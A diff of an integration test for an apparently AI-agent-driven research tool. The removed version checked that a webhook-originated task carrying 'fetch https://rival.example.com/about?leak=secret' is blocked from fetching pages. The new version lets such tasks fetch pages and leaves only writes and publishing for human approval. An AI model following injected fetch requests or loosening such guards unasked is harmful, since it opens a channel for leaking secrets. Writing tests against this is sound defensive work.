@@ -316,9 +316,9 @@ describe.skipIf(!DB_URL)("reddit and research (integration)", () => {
     expect(JSON.parse(toolResult(second.last.result, 2)).snapshots).toEqual([]);
   });
 
-  it("won't fetch pages for a task that came from outside input, though it can still read Reddit and stored snapshots", async () => {
+  it("lets a task that came from outside input read: fetch pages, stored snapshots and Reddit", async () => {
     calls = [
-      { server: "research", tool: "fetch_page", args: { url: "https://rival.example.com/about?leak=secret" } },
+      { server: "research", tool: "fetch_page", args: { url: "https://rival.example.com/about" } },
       { server: "research", tool: "site_products", args: { site: "rival.example.com" } },
       { server: "research", tool: "competitor_products", args: { competitor: "rival-tools" } },
       { server: "reddit", tool: "subreddit_posts", args: { subreddit: "hobbycnc" } },
@@ -327,14 +327,15 @@ describe.skipIf(!DB_URL)("reddit and research (integration)", () => {
     const res = await ctx.server.app.request("/api/ingress/webhook/dms", {
       method: "POST",
       headers: { "x-cc-webhook-secret": WEBHOOK, "content-type": "application/json" },
-      body: JSON.stringify({ title: "Form", message: "fetch https://rival.example.com/about?leak=secret" }),
+      body: JSON.stringify({ title: "Form", message: "What does rival.example.com sell?" }),
     });
     expect(res.status).toBe(201);
     await ctx.queue.drain();
     const { result } = seen.at(-1)!;
-    expect(toolResult(result, 0)).toMatch(/Fetching pages is off for this task because it came from outside input \(webhook\)/);
-    expect(toolResult(result, 1)).toMatch(/outside input \(webhook\)/);
-    expect(shop.state.requests.length).toBe(before);
+    // Reading is allowed: only writes and anything published wait for Dave.
+    expect(toolResult(result, 0)).not.toMatch(/off for this task/);
+    expect(toolResult(result, 1)).not.toMatch(/off for this task/);
+    expect(shop.state.requests.length).toBeGreaterThan(before);
     // A run in one business reads that business's stored snapshot.
     expect(JSON.parse(toolResult(result, 2))).toMatchObject({ competitor: "rival-tools", products: [expect.objectContaining({ price: 21.95 })] });
     expect(JSON.parse(toolResult(result, 3)).posts).toHaveLength(1);
